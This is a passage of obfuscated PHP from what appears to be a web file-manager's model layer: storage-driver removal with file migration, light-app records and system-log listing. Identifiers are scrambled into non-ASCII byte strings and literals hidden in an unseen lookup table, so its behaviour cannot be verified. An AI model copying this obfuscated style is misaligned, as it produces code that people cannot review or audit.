return $this->_parseError($¾§ µ­, $¼¨­üÀ—, $ÑÍœÈ†Ù); } $•÷Ú½ƒÀ[$é¶Ôá‡[1301]] = $ÙÇƒÃå’; $Èò±°à[$é¶Ôá‡[16]] = json_encode($•÷Ú½ƒÀ); $Èò±°à[$é¶Ôá‡[106]] = $Ãéè¤ˆÎ; return !0; } private function _parseError($à«ª÷½§, $¿‚ßğõç, $¥İî©Ä÷ = false) { $Ş¨Áúå† =& $_SERVER[‰‰Ş‚€]; if ($¿‚ßğõç == $Ş¨Áúå†[78] && stripos($à«ª÷½§, $Ş¨Áúå†[2379])) { $ãİ€ñºş = explode($Ş¨Áúå†[20], $à«ª÷½§); $ÅÁõ¾Åˆ = isset($ãİ€ñºş[1]) ? $ãİ€ñºş[1] : $Ş¨Áúå†[22]; $íµÜ€¦ = array($Ş¨Áúå†[2380] => LNG($Ş¨Áúå†[2381]), $Ş¨Áúå†[2382] => LNG($Ş¨Áúå†[2383])); if (isset($íµÜ€¦[$ÅÁõ¾Åˆ])) { $à«ª÷½§ = $íµÜ€¦[$ÅÁõ¾Åˆ]; } } if (stripos($à«ª÷½§, $Ş¨Áúå†[2384]) === 0) { $ìÙÛ½ìÇ = strpos($à«ª÷½§, $Ş¨Áúå†[186]); if ($ìÙÛ½ìÇ === !1) { $ìÙÛ½ìÇ = strpos($à«ª÷½§, $Ş¨Áúå†[14]); } if ($ìÙÛ½ìÇ !== !1) { $à«ª÷½§ = substr($à«ª÷½§, $ìÙÛ½ìÇ + 1); } } $à«ª÷½§ = LNG($Ş¨Áúå†[1308]) . $à«ª÷½§; if ($¥İî©Ä÷) { return $à«ª÷½§; } show_json($à«ª÷½§, !1); } public function driverListSystem() { $ØÂ»Ùóú =& $_SERVER[‰‰Ş‚€]; $À°òä‰´ = parent::listData(); $óĞ¬€Ã = array(); foreach ($À°òä‰´ as $šøõâ¢) { unset($šøõâ¢[$ØÂ»Ùóú[242]], $šøõâ¢[$ØÂ»Ùóú[98]]); if (!is_array($šøõâ¢[$ØÂ»Ùóú[16]])) { $šøõâ¢[$ØÂ»Ùóú[16]] = json_decode($šøõâ¢[$ØÂ»Ùóú[16]], !0); } $óĞ¬€Ã[] = $šøõâ¢; } return $óĞ¬€Ã; } public function defaultDriver() { $ÍÚŒıŠí =& $_SERVER[‰‰Ş‚€]; $Øûä€ÑÑ = parent::listData(); $¬ó»ÅËÀ = array_filter_by_field($Øûä€ÑÑ, $ÍÚŒıŠí[47], 1); $¬ó»ÅËÀ = $¬ó»ÅËÀ[0]; if (!$¬ó»ÅËÀ) { return array(); } if (!is_array($¬ó»ÅËÀ[$ÍÚŒıŠí[16]])) { $¬ó»ÅËÀ[$ÍÚŒıŠí[16]] = json_decode($¬ó»ÅËÀ[$ÍÚŒıŠí[16]], !0); } return $¬ó»ÅËÀ; } public function driverInfo($˜Ï°ÔŞ) { $åÌï‡¯š =& $_SERVER[‰‰Ş‚€]; $Š›ô¼ = array_to_keyvalue(parent::listData(), $åÌï‡¯š[491]); if (!isset($Š›ô¼[$˜Ï°ÔŞ])) { return !1; } $¹Ü¼’‚ = $Š›ô¼[$˜Ï°ÔŞ]; if (!is_array($¹Ü¼’‚[$åÌï‡¯š[16]])) { $¹Ü¼’‚[$åÌï‡¯š[16]] = json_decode($¹Ü¼’‚[$åÌï‡¯š[16]], !0); } return $¹Ü¼’‚; } public function remove($Û’¨øª) { $this->removeShareItems($Û’¨øª); return parent::remove($Û’¨øª); } public function removeWithFile($ã˜—™¢÷, $âˆ²Ôõ¾, $€åƒ‡åÙ, $€îœõ¤˜ = false) { $Şõ†•ê =& $_SERVER[‰‰Ş‚€]; $ê«ÔâÌç = array($Şõ†•ê[922] => $ã˜—™¢÷); $‘Î¯ü­Ê = Model($Şõ†•ê[564])->where($ê«ÔâÌç)->count(); $»“ÁÚµÙ = Model($Şõ†•ê[564])->where($ê«ÔâÌç)->sum($Şõ†•ê[89]); $’²–úÔ… = $âˆ²Ôõ¾ . $Şõ†•ê[2385] . $ã˜—™¢÷; $‚¢¯İŞ” = LNG($âˆ²Ôõ¾ == $Şõ†•ê[643] ? $Şõ†•ê[2386] : $Şõ†•ê[2387]); $®‡İ£ô¨ = new TaskFileTransfer($’²–úÔ…, $Şõ†•ê[224], $‘Î¯ü­Ê, $‚¢¯İŞ” . $Şõ†•ê[481] . $€åƒ‡åÙ[$Şõ†•ê[42]] . $Şõ†•ê[223] . $ã˜—™¢÷); $®‡İ£ô¨->task[$Şõ†•ê[860]] = (double) $»“ÁÚµÙ; $øïø„€ä = KodIO::defaultDriver(); $‹Ø¢¼’Ê = $øïø„€ä[$Şõ†•ê[491]]; $›êÓ¤®° = $””¢¶¶å = $Üğ¤ùÓ• = array(); $²ï‚Ú Ö = Model($Şõ†•ê[241])->where($ê«ÔâÌç)->field($Şõ†•ê[2388])->select(); foreach ($²ï‚Ú Ö as $ÅÂ–±µß) { $ÚËİÃ´º = $ÅÂ–±µß[$Şõ†•ê[561]]; if ($€îœõ¤˜) { $””¢¶¶å[] = $ÚËİÃ´º; continue; } $¨”°©Ø = $ÅÂ–±µß[$Şõ†•ê[97]]; $¥çñğíğ = get_path_father($¨”°©Ø); $Üğ¤ùÓ•[] = $¥çñğíğ; $¥çñğíğ = str_replace("\x7b\x69\157\72{$ã˜—™¢÷}\175\57", "\173\x69\x6f\x3a{$‹Ø¢¼’Ê}\175\x2f", $¥çñğíğ); if (!IO::exist($¨”°©Ø)) { $›êÓ¤®°[] = $ÚËİÃ´º; $®‡İ£ô¨->updateFileEnd($ÅÂ–±µß[$Şõ†•ê[42]], $ÅÂ–±µß[$Şõ†•ê[89]]); write_log($Şõ†•ê[2389] . $¨”°©Ø, $Şõ†•ê[1953]); continue; } $§ıĞğ = IO::move($¨”°©Ø, $¥çñğíğ, REPEAT_RENAME); if (!$§ıĞğ) { $””¢¶¶å[] = $ÚËİÃ´º; $®‡İ£ô¨->updateFileEnd($ÅÂ–±µß[$Şõ†•ê[42]], $ÅÂ–±µß[$Şõ†•ê[89]]); write_log($Şõ†•ê[2390] . $¨”°©Ø, $Şõ†•ê[1953]); continue; } $ê«ÔâÌç = array($Şõ†•ê[561] => $ÚËİÃ´º); $–ºµ¤ß¦ = array($Şõ†•ê[922] => $‹Ø¢¼’Ê, $Şõ†•ê[97] => $§ıĞğ); Model($Şõ†•ê[241])->where($ê«ÔâÌç)->save($–ºµ¤ß¦); } $ÛäúŒıá = $®‡İ£ô¨->task; if (!$€îœõ¤˜) { Cache::set($’²–úÔ…, $ÛäúŒıá); } $®‡İ£ô¨->end(); $›êÓ¤®° = array_unique($›êÓ¤®°); $””¢¶¶å = array_unique($””¢¶¶å); if (!$€îœõ¤˜ && ($›êÓ¤®° || $””¢¶¶å)) { $ÒİÚ´£ê = array(); if ($›êÓ¤®°) { $ÒİÚ´£ê[] = sprintf(LNG($Şõ†•ê[2391]), count($›êÓ¤®°)); } if ($””¢¶¶å) { $ÒİÚ´£ê[] = sprintf(LNG($Şõ†•ê[2392]), count($””¢¶¶å)); } $ÒİÚ´£ê = sprintf(LNG($Şõ†•ê[2393]), implode($Şõ†•ê[2394], $ÒİÚ´£ê)) . $Şõ†•ê[2395] . date($Şõ†•ê[2396]) . $Şõ†•ê[2397]; if ($âˆ²Ôõ¾ == $Şõ†•ê[1266]) { $ÒİÚ´£ê .= $Şõ†•ê[2398] . LNG($Şõ†•ê[2399]); } else { $ÒİÚ´£ê = LNG($Şõ†•ê[2400]) . $Şõ†•ê[2401] . $ÒİÚ´£ê; } $ÛäúŒıá[$Şõ†•ê[1303]] = $ÒİÚ´£ê; Cache::set($’²–úÔ…, $ÛäúŒıá); unset($€åƒ‡åÙ[$Şõ†•ê[16]]); $ß£œÔ²î = array($Şõ†•ê[491] => $ã˜—™¢÷, $Şõ†•ê[2270] => $Şõ†•ê[643], $Şõ†•ê[42] => $€åƒ‡åÙ[$Şõ†•ê[42]], $Şõ†•ê[106] => $€åƒ‡åÙ[$Şõ†•ê[106]]); Hook::trigger($Şõ†•ê[1831], array($Şõ†•ê[1326] => $ß£œÔ²î, $Şõ†•ê[1336] => !0)); show_json($ÒİÚ´£ê, !1, 100111); } if ($âˆ²Ôõ¾ == $Şõ†•ê[643]) { return !0; } if ($›êÓ¤®° || $””¢¶¶å) { $ø÷áşûï = array_merge($›êÓ¤®°, $””¢¶¶å); $ø÷áşûï = array_filter(array_unique($ø÷áşûï)); $this->removeByFileID($ø÷áşûï); } if ($Üğ¤ùÓ•) { $Üğ¤ùÓ• = array_filter(array_unique($Üğ¤ùÓ•)); foreach ($Üğ¤ùÓ• as $¨”°©Ø) { $îÛ¿ÕÀ = IO::has($¨”°©Ø, !0); if (!$îÛ¿ÕÀ[$Şõ†•ê[250]] && !$îÛ¿ÕÀ[$Şõ†•ê[251]]) { IO::remove($¨”°©Ø); } } } return $this->remove($ã˜—™¢÷); } private function removeByFileID($¬À›²Â = array()) { $˜Çşö˜´ =& $_SERVER[‰‰Ş‚€]; if (empty($¬À›²Â)) { return; } $ãÈëË = array($˜Çşö˜´[561] => array($˜Çşö˜´[17], $¬À›²Â)); $‡‘Æ†‹Õ = Model($˜Çşö˜´[1467])->where($ãÈëË)->field($˜Çşö˜´[2346])->select(); if (!$‡‘Æ†‹Õ) { return Model($˜Çşö˜´[564])->remove($¬À›²Â); } $‡‘Æ†‹Õ = array_to_keyvalue($‡‘Æ†‹Õ, $˜Çşö˜´[202], $˜Çşö˜´[561]); foreach ($‡‘Æ†‹Õ as $íÂçŞéˆ => $ÃµÍº­œ) { Model($˜Çşö˜´[929])->removeNow($íÂçŞéˆ, !1); } $şÔÃÙ¢Ã = array_diff($¬À›²Â, array_unique(array_values($‡‘Æ†‹Õ))); if ($şÔÃÙ¢Ã) { return Model($˜Çşö˜´[564])->remove($şÔÃÙ¢Ã); } } private function removeShareItems($ÒÛ­¨›Ã) { $›˜œûá =& $_SERVER[‰‰Ş‚€]; $ş÷¢¹ªÙ = "\x7b\151\x6f\72{$ÒÛ­¨›Ã}\x7d\x2f"; $Ù¯ô—ş = array($›˜œûá[202] => 0, $›˜œûá[1296] => array($›˜œûá[478], "{$ş÷¢¹ªÙ}\45")); $‘Â¯ú‰ç = Model($›˜œûá[2000])->where($Ù¯ô—ş)->field($›˜œûá[688])->select(); if (empty($‘Â¯ú‰ç)) { return; } $ óËÛæ = array_to_keyvalue($‘Â¯ú‰ç, $›˜œûá[22], $›˜œûá[688]); Model($›˜œûá[687])->remove($ óËÛæ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\114\x69\x67\x68\x74\x41\160\x70"; public $modelType = "\123\171\x73\x74\x65\155\x4f\160\164\x69\157\x6e"; public $field = array("\x6e\x61\155\x65", "\x67\162\x6f\x75\160", "\x64\x65\163\143", "\x63\157\156\164\x65\156\164"); public function listData($Øè­ÃÔ• = false, $¥ŒüÀ¦‰ = "\x6d\157\144\x69\146\171\x54\x69\x6d\145", $ÎÄ°Ş¹ğ = true) { return parent::listData($Øè­ÃÔ•, $¥ŒüÀ¦‰, $ÎÄ°Ş¹ğ); } public function remove($¥”ÏçÄ) { $´Ş¹±íÀ = $this->findByName($¥”ÏçÄ); if (!$´Ş¹±íÀ) { return !1; } return parent::remove($´Ş¹±íÀ[$_SERVER[‰‰Ş‚€][491]]); } public function add($ËùŞöÎË) { if ($this->findByName($ËùŞöÎË[$_SERVER[‰‰Ş‚€][42]])) { return !1; } return parent::insert($ËùŞöÎË); } public function update($¹íƒã , $·ˆ¶èş) { $ì¿¢¾Éµ =& $_SERVER[‰‰Ş‚€]; $œğİ„®ú = $this->findByName($¹íƒã ); $Ÿ· …Ë… = $this->findByName($·ˆ¶èş[$ì¿¢¾Éµ[42]]); if (!$œğİ„®ú || $Ÿ· …Ë… && $Ÿ· …Ë…[$ì¿¢¾Éµ[491]] != $œğİ„®ú[$ì¿¢¾Éµ[491]]) { return !1; } return parent::update($œğİ„®ú[$ì¿¢¾Éµ[491]], $·ˆ¶èş); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\155\137\154\157\147"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\151\x6d\145", "\x74\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\x66\x75\156\143\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $†“•¥›Å =& $_SERVER[‰‰Ş‚€]; return array($†“•¥›Å[2402] => LNG($†“•¥›Å[2403]), $†“•¥›Å[2404] => LNG($†“•¥›Å[2405]), $†“•¥›Å[1964] => LNG($†“•¥›Å[2406]), $†“•¥›Å[2407] => LNG($†“•¥›Å[2408]), $†“•¥›Å[2409] => LNG($†“•¥›Å[2410]), $†“•¥›Å[2411] => LNG($†“•¥›Å[2412]), $†“•¥›Å[2413] => LNG($†“•¥›Å[2414]), $†“•¥›Å[1993] => LNG($†“•¥›Å[2414]), $†“•¥›Å[1994] => LNG($†“•¥›Å[2415]), $†“•¥›Å[2416] => LNG($†“•¥›Å[2417]), $†“•¥›Å[2418] => LNG($†“•¥›Å[2419]), $†“•¥›Å[2420] => LNG($†“•¥›Å[2421]), $†“•¥›Å[2422] => LNG($†“•¥›Å[2423]), $†“•¥›Å[1991] => LNG($†“•¥›Å[2424]), $†“•¥›Å[2425] => LNG($†“•¥›Å[2426]), $†“•¥›Å[1998] => LNG($†“•¥›Å[2427]), $†“•¥›Å[2428] => LNG($†“•¥›Å[2429]), $†“•¥›Å[2430] => LNG($†“•¥›Å[2431]), $†“•¥›Å[2432] => LNG($†“•¥›Å[2433]), $†“•¥›Å[2434] => LNG($†“•¥›Å[2435]), $†“•¥›Å[2001] => LNG($†“•¥›Å[2436]), $†“•¥›Å[2002] => LNG($†“•¥›Å[2437]), $†“•¥›Å[2438] => LNG($†“•¥›Å[2439]), $†“•¥›Å[2440] => LNG($†“•¥›Å[2441]), $†“•¥›Å[2442] => LNG($†“•¥›Å[2443]), $†“•¥›Å[1996] => LNG($†“•¥›Å[2444]), $†“•¥›Å[2445] => LNG($†“•¥›Å[2446]), $†“•¥›Å[1995] => LNG($†“•¥›Å[2447]), $†“•¥›Å[2448] => LNG($†“•¥›Å[2448]), $†“•¥›Å[2449] => LNG($†“•¥›Å[2450]), $†“•¥›Å[2451] => LNG($†“•¥›Å[2448]), $†“•¥›Å[2452] => LNG($†“•¥›Å[2453]), $†“•¥›Å[2454] => LNG($†“•¥›Å[2455]), $†“•¥›Å[2456] => LNG($†“•¥›Å[2455]), $†“•¥›Å[2457] => LNG($†“•¥›Å[2458]), $†“•¥›Å[2459] => LNG($†“•¥›Å[2459]), $†“•¥›Å[2460] => LNG($†“•¥›Å[1968]), $†“•¥›Å[2461] => LNG($†“•¥›Å[2462]), $†“•¥›Å[2463] => LNG($†“•¥›Å[2464]), $†“•¥›Å[2465] => LNG($†“•¥›Å[2466]), $†“•¥›Å[2467] => LNG($†“•¥›Å[2468]), $†“•¥›Å[2469] => LNG($†“•¥›Å[2470]), $†“•¥›Å[2471] => LNG($†“•¥›Å[2471]), $†“•¥›Å[2472] => LNG($†“•¥›Å[2473]), $†“•¥›Å[2474] => LNG($†“•¥›Å[2475]), $†“•¥›Å[2476] => LNG($†“•¥›Å[2477]), $†“•¥›Å[2478] => LNG($†“•¥›Å[2479]), $†“•¥›Å[2480] => LNG($†“•¥›Å[2481]), $†“•¥›Å[2482] => LNG($†“•¥›Å[2483]), $†“•¥›Å[221] => LNG($†“•¥›Å[221]), $†“•¥›Å[222] => LNG($†“•¥›Å[2484]), $†“•¥›Å[2485] => LNG($†“•¥›Å[2485])); } private function typeFile() { $ïú°¾Éè =& $_SERVER[‰‰Ş‚€]; $„ŞöûßÏ = array($ïú°¾Éè[1998] => array($ïú°¾Éè[1999]), $ïú°¾Éè[2420] => array($ïú°¾Éè[2486]), $ïú°¾Éè[2422] => array($ïú°¾Éè[2487]), $ïú°¾Éè[1991] => array($ïú°¾Éè[1992], $ïú°¾Éè[2488]), $ïú°¾Éè[2430] => array(), $ïú°¾Éè[2432] => array(), $ïú°¾Éè[2434] => array(), $ïú°¾Éè[2001] => array($ïú°¾Éè[2003]), $ïú°¾Éè[2002] => array($ïú°¾Éè[2003]), $ïú°¾Éè[2438] => array($ïú°¾Éè[2489]), $ïú°¾Éè[2440] => array($ïú°¾Éè[2489]), $ïú°¾Éè[2442] => array($ïú°¾Éè[2490]), $ïú°¾Éè[2428] => array($ïú°¾Éè[2491]), $ïú°¾Éè[1996] => array($ïú°¾Éè[2492]), $ïú°¾Éè[2445] => array($ïú°¾Éè[2493]), $ïú°¾Éè[1995] => array($ïú°¾Éè[1997])); return $„ŞöûßÏ; } private function typeAll() { $Ïúà¡Ñ´ =& $_SERVER[‰‰Ş‚€]; $‹İöÀ«® = $this->typeList; $·© õüå = array_filter($this->typeFile()); foreach ($·© õüå as $©õ‚Ñöå => $”ïÏÀğ¡) { $‹İöÀ«®[$”ïÏÀğ¡[0]] = $‹İöÀ«®[$©õ‚Ñöå]; } $‹İöÀ«®[$Ïúà¡Ñ´[2003]] = LNG($Ïúà¡Ñ´[2494]); $‹İöÀ«®[$Ïúà¡Ñ´[2489]] = LNG($Ïúà¡Ñ´[2495]); return $‹İöÀ«®; } public function addLog($À´Ÿ¡©ú, $×şñí‡Š = array()) { $Á’ã›† =& $_SERVER[‰‰Ş‚€]; if (!isset($this->typeList[$À´Ÿ¡©ú])) { return; } $™´îô÷˜ = Session::get($Á’ã›†[2161]); if (!$™´îô÷˜) { $™´îô÷˜ = _get($×şñí‡Š, $Á’ã›†[1820], 0); } if ($À´Ÿ¡©ú == $Á’ã›†[2461] && is_array($×şñí‡Š[$Á’ã›†[2496]]) && !$×şñí‡Š[$Á’ã›†[2496]]) { return; } $—€¯ş›õ = get_client_ip(); if (!$×şñí‡Š || strlen(json_encode($×şñí‡Š)) >= 1024 * 64) { if ($×şñí‡Š && is_array($×şñí‡Š)) { $×şñí‡Š = array_intersect_key($×şñí‡Š, array_flip($Á’ã›†[491], $Á’ã›†[42])); $×şñí‡Š[$Á’ã›†[2497]] = $—€¯ş›õ; } else { $×şñí‡Š = array($Á’ã›†[2497] => $—€¯ş›õ); } } else { if (is_array($×şñí‡Š)) { $×şñí‡Š[$Á’ã›†[2497]] = $—€¯ş›õ; } else { $×şñí‡Š = array($Á’ã›†[1326] => $×şñí‡Š, $Á’ã›†[2497] => $—€¯ş›õ); } } $×şñí‡Š[$Á’ã›†[2498]] = ACTION; $×şñí‡Š = array($Á’ã›†[1810] => Session::sign(), $Á’ã›†[1811] => intval($™´îô÷˜), $Á’ã›†[43] => $À´Ÿ¡©ú, $Á’ã›†[1813] => json_encode($×şñí‡Š)); Hook::trigger($Á’ã›†[2499], $×şñí‡Š); return parent::add($×şñí‡Š); } public function remove($Ğé“Ç÷Ó) { $this->where(array($_SERVER[‰‰Ş‚€][512] => $Ğé“Ç÷Ó))->delete(); } private function _makeOrder($› åæ = '') { $ûŸàèá£ =& $_SERVER[‰‰Ş‚€]; $ø ãá¯– = $ûŸàèá£[242]; $ü·Á¥ÈÅ = array($ûŸàèá£[541] => $ûŸàèá£[542], $ûŸàèá£[543] => $ûŸàèá£[544]); $¶øÜ«¨ = Input::get($ûŸàèá£[549], $ûŸàèá£[17], $ûŸàèá£[2204], array($ûŸàèá£[2116], $ûŸàèá£[543])); $¶øÜ«¨ = $ü·Á¥ÈÅ[$¶øÜ«¨]; $› åæ = $› åæ . "{$ø ãá¯–}\x20{$¶øÜ«¨}"; return $this->order($› åæ); } public function get($»Àúîæ† = '') { $‰Ãàù¡î =& $_SERVER[‰‰Ş‚€]; if (!$»Àúîæ†) { show_json(array()); } $ñæâøÕš = array(); if ($»Àúîæ†[$‰Ãàù¡î[1820]]) { $ñæâøÕš[$‰Ãàù¡î[1820]] = $»Àúîæ†[$‰Ãàù¡î[1820]]; } if (isset($»Àúîæ†[$‰Ãàù¡î[857]])) { $±‚è×…Ğ = $»Àúîæ†[$‰Ãàù¡î[857]]; $¯™Í×›˜ = isset($»Àúîæ†[$‰Ãàù¡î[858]]) ? $»Àúîæ†[$‰Ãàù¡î[858]] : time(); $ñæâøÕš[$‰Ãàù¡î[242]] = array($‰Ãàù¡î[417], array($±‚è×…Ğ, $¯™Í×›˜)); } if ($»Àúîæ†[$‰Ãàù¡î[43]]) { $‰äØşœ± = explode($‰Ãàù¡î[60], $»Àúîæ†[$‰Ãàù¡î[43]]); $§åïí”· = $this->typeFile(); $Ø°˜¯Øù = array(); foreach ($‰äØşœ± as $³¾Ã¶Œ·) { $Ø°˜¯Øù[] = $³¾Ã¶Œ·; if (isset($§åïí”·[$³¾Ã¶Œ·])) { $Ø°˜¯Øù = array_merge($Ø°˜¯Øù, $§åïí”·[$³¾Ã¶Œ·]); } } $Ø°˜¯Øù = array_unique($Ø°˜¯Øù); if ($Ø°˜¯Øù) { $ñæâøÕš[$‰Ãàù¡î[43]] = array($‰Ãàù¡î[17], $Ø°˜¯Øù); } } else { $ñæâøÕš[$‰Ãàù¡î[43]] = array($‰Ãàù¡î[2500], $‰Ãàù¡î[2501]); } if (!empty($»Àúîæ†[$‰Ãàù¡î[2497]])) { $ñæâøÕš[$‰Ãàù¡î[544]] = array($‰Ãàù¡î[478], "\x25{$»Àúîæ†[$‰Ãàù¡î[2497]]}\45"); } $ÎğŸçÔ = $this->_makeOrder()->where($ñæâøÕš)->selectPage(); if (empty($ÎğŸçÔ[$‰Ãàù¡î[454]])) { show_json(array(), !0, $ÎğŸçÔ[$‰Ãàù¡î[451]]); } $ÎğŸçÔ[$‰Ãàù¡î[454]] = $this->logList($ÎğŸçÔ[$‰Ãàù¡î[454]]); return $ÎğŸçÔ; } private function ipAddress(&$»ÂÏ‰‡Í) { $„¾•ôŒ” =& $_SERVER[‰‰Ş‚€]; if (!empty($»ÂÏ‰‡Í[$„¾•ôŒ”[2497]])) { $¿şÀ·­Ë = IpLocation::get($»ÂÏ‰‡Í[$„¾•ôŒ”[2497]]); } else { $¿şÀ·­Ë = LNG($„¾•ôŒ”[2502]); } $»ÂÏ‰‡Í[$„¾•ôŒ”[2503]] = $¿şÀ·­Ë; } private function descZipDownload($µÈ¨é“è, &$ÄËØ’‚®) { $œäçˆšŒ =& $_SERVER[‰‰Ş‚€]; if (!isset($µÈ¨é“è[$œäçˆšŒ[2504]])) { return; } $â¾ €¥ = json_decode($µÈ¨é“è[$œäçˆšŒ[2504]], !0); foreach ($â¾ €¥ as $ùğö×•) { try { $ù¯‡±¼„ = IO::infoFullSimple($ùğö×•[$œäçˆšŒ[97]]); } catch (Exception $èšû«úÎ) { continue; } $µÈ¨é“è[$œäçˆšŒ[97]] = $ùğö×•[$œäçˆšŒ[97]]; $ÄËØ’‚®[] = $µÈ¨é“è[$œäçˆšŒ[202]] = $ù¯‡±¼„[$œäçˆšŒ[202]]; $ÄËØ’‚®[] = $µÈ¨é“è[$œäçˆšŒ[2265]] = $ù¯‡±¼„[$œäçˆšŒ[201]]; break; } return $µÈ¨é“è; } private function getSourceList(&$±‡×«çô) { $ùÈºãá‘ =& $_SERVER[‰‰Ş‚€]; $³ ¼Û´ = array(); foreach ($±‡×«çô as $úåÏ¡Ô­ => $—âù»»ë) { $ğ¯Å˜£Ã = json_decode($—âù»»ë[$ùÈºãá‘[544]], !0); if ($—âù»»ë[$ùÈºãá‘[43]] == $ùÈºãá‘[1994]) { $ğ¯Å˜£Ã = $this->descZipDownload($ğ¯Å˜£Ã, $³ ¼Û´); $±‡×«çô[$úåÏ¡Ô­][$ùÈºãá‘[544]] = json_encode($ğ¯Å˜£Ã); continue; } if (strpos($—âù»»ë[$ùÈºãá‘[43]], $ùÈºãá‘[2267]) !== 0) { if (!isset($ğ¯Å˜£Ã[$ùÈºãá‘[97]]) || strpos($—âù»»ë[$ùÈºãá‘[43]], $ùÈºãá‘[2505]) !== 0) { continue; } try { $Ç€¾úê‚ = IO::infoFullSimple($ğ¯Å˜£Ã[$ùÈºãá‘[97]]); } catch (Exception $µÁ‡¥³¾) { continue; } $³ ¼Û´[] = $ğ¯Å˜£Ã[$ùÈºãá‘[202]] = $Ç€¾úê‚[$ùÈºãá‘[202]]; $³ ¼Û´[] = $ğ¯Å˜£Ã[$ùÈºãá‘[2265]] = $Ç€¾úê‚[$ùÈºãá‘[201]]; $±‡×«çô[$úåÏ¡Ô­][$ùÈºãá‘[544]] = json_encode($ğ¯Å˜£Ã); continue; } $³ ¼Û´[] = $ğ¯Å˜£Ã[$ùÈºãá‘[202]]; $³ ¼Û´[] = $ğ¯Å˜£Ã[$ùÈºãá‘[2265]]; if ($ğ¯Å˜£Ã[$ùÈºãá‘[43]] == $ùÈºãá‘[643]) { $³ ¼Û´[] = $ğ¯Å˜£Ã[$ùÈºãá‘[544]][$ùÈºãá‘[1278]]; $³ ¼Û´[] = $ğ¯Å˜£Ã[$ùÈºãá‘[544]][$ùÈºãá‘[1279]]; } if ($ğ¯Å˜£Ã[$ùÈºãá‘[43]] == $ùÈºãá‘[2276]) { $³ ¼Û´[] = $ğ¯Å˜£Ã[$ùÈºãá‘[544]][$ùÈºãá‘[202]]; } } if (!$³ ¼Û´) { return array(); } return Model($ùÈºãá‘[929])->sourceListInfo($³ ¼Û´, !0); } private function logList($·›±ãÖ˜) { $Œ ‹Ãà =& $_SERVER[‰‰Ş‚€]; $§íšÌªË = array_to_keyvalue($·›±ãÖ˜, $Œ ‹Ãà[22], $Œ ‹Ãà[1820]); $ÄààÁÉ° = Model($Œ ‹Ãà[617])->userListInfo(array_unique($§íšÌªË)); $îø½š²† = $this->getSourceList($·›±ãÖ˜); $·ı³ªú½ = $this->typeAll(); $’ŠâÔİ = array(); $¹Óêàüƒ = array(); foreach ($·›±ãÖ˜ as $Ë±·¡Ñ => $¸Áşåòâ) { $¼åÆÀÔâ = $¸Áşåòâ[$Œ ‹Ãà[43]]; $ÆÙÄò = isset($ÄààÁÉ°[$¸Áşåòâ[$Œ ‹Ãà[1820]]]) ? $ÄààÁÉ°[$¸Áşåòâ[$Œ ‹Ãà[1820]]] : !1; $†Ò¦±¤ = strpos($¼åÆÀÔâ, $Œ ‹Ãà[2506]) === 0 ? LNG($Œ ‹Ãà[2507]) : LNG($Œ ‹Ãà[2502]); $¸Áşåòâ[$Œ ‹Ãà[42]] = isset($ÆÙÄò[$Œ ‹Ãà[42]]) ? $ÆÙÄò[$Œ ‹Ãà[42]] : LNG($Œ ‹Ãà[2502]); $¸Áşåòâ[$Œ ‹Ãà[2327]] = isset($ÆÙÄò[$Œ ‹Ãà[2327]]) ? $ÆÙÄò[$Œ ‹Ãà[2327]] : $Œ ‹Ãà[22]; $¸Áşåòâ[$Œ ‹Ãà[1707]] = isset($·ı³ªú½[$¼åÆÀÔâ]) ? $·ı³ªú½[$¼åÆÀÔâ] : $†Ò¦±¤; $¸Áşåòâ[$Œ ‹Ãà[2203]] = $ÆÙÄò; $©¸ÛÏ¸ = json_decode($¸Áşåòâ[$Œ ‹Ãà[544]], !0); $¸Áşåòâ[$Œ ‹Ãà[2497]] = isset($©¸ÛÏ¸[$Œ ‹Ãà[2497]]) ? $©¸ÛÏ¸[$Œ ‹Ãà[2497]] : $Œ ‹Ãà[22]; $¸Áşåòâ[$Œ ‹Ãà[2503]] = IpLocation::get($¸Áşåòâ[$Œ ‹Ãà[2497]]); if (strpos($¼åÆÀÔâ, $Œ ‹Ãà[2267]) === 0 || isset($©¸ÛÏ¸[$Œ ‹Ãà[2265]])) { $©¸ÛÏ¸[$Œ ‹Ãà[100]] = $îø½š²†[$©¸ÛÏ¸[$Œ ‹Ãà[202]]]; $©¸ÛÏ¸[$Œ ‹Ãà[2281]] = $îø½š²†[$©¸ÛÏ¸[$Œ ‹Ãà[2265]]]; if ($©¸ÛÏ¸[$Œ ‹Ãà[43]] == $Œ ‹Ãà[643]) { $©¸ÛÏ¸[$Œ ‹Ãà[544]][$Œ ‹Ãà[1278]] = $îø½š²†[$©¸ÛÏ¸[$Œ ‹Ãà[544]][$Œ ‹Ãà[1278]]]; $©¸ÛÏ¸[$Œ ‹Ãà[544]][$Œ ‹Ãà[1279]] = $îø½š²†[$©¸ÛÏ¸[$Œ ‹Ãà[544]][$Œ ‹Ãà[1279]]]; } if ($©¸ÛÏ¸[$Œ ‹Ãà[43]] == $Œ ‹Ãà[2276]) { $©¸ÛÏ¸[$Œ ‹Ãà[544]][$Œ ‹Ãà[202]] = $îø½š²†[$©¸ÛÏ¸[$Œ ‹Ãà[544]][$Œ ‹Ãà[202]]]; } if ($©¸ÛÏ¸[$Œ ‹Ãà[43]] == $Œ ‹Ãà[1266]) { $©¸ÛÏ¸[$Œ ‹Ãà[2281]] = $©¸ÛÏ¸[$Œ ‹Ãà[100]]; $©¸ÛÏ¸[$Œ ‹Ãà[2265]] = $©¸ÛÏ¸[$Œ ‹Ãà[2281]][$Œ ‹Ãà[202]]; $©¸ÛÏ¸[$Œ ‹Ãà[100]] = !1; $©¸ÛÏ¸[$Œ ‹Ãà[202]] = $Œ ‹Ãà[22]; } $Æ­ƒğûÎ = array($Œ ‹Ãà[1266], $Œ ‹Ãà[2263]); if (!in_array($©¸ÛÏ¸[$Œ ‹Ãà[43]], $Æ­ƒğûÎ)) { if ($©¸ÛÏ¸[$Œ ‹Ãà[100]] && $©¸ÛÏ¸[$Œ ‹Ãà[100]][$Œ ‹Ãà[199]] == $Œ ‹Ãà[200]) { $¹Óêàüƒ[] = $¸Áşåòâ[$Œ ‹Ãà[491]]; unset($·›±ãÖ˜[$Ë±·¡Ñ]); continue; } if ($©¸ÛÏ¸[$Œ ‹Ãà[2281]] && $©¸ÛÏ¸[$Œ 